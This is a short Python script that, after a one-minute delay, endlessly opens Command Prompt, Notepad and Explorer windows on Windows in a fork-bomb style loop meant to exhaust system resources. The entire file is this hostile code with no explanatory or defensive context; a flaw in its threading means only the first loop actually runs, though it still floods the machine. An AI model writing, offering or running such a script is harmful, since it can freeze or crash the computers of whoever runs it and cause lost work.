import os
from platform import system
from threading import Thread
from time import sleep
from sys import exit

OS = system()

def cmd_bomb() -> None:

    if OS == "Windows":

        while True:

            os.system("start cmd")


    else:
        exit(1)


def notepad_bomb() ->None:

    if OS == "Windows":

        while True:

            os.system("start notepad")


    else:
        exit(1)


def explorer_bomb() -> None:

    if OS == "Windows":

        while True:

            os.system("start explorer")


    else:
        exit(1)






if __name__ == "__main__":

    sleep(60)

    for _ in range(1000):

        Thread(target=cmd_bomb()).start()
        Thread(target=notepad_bomb()).start()
        Thread(target=explorer_bomb()).start()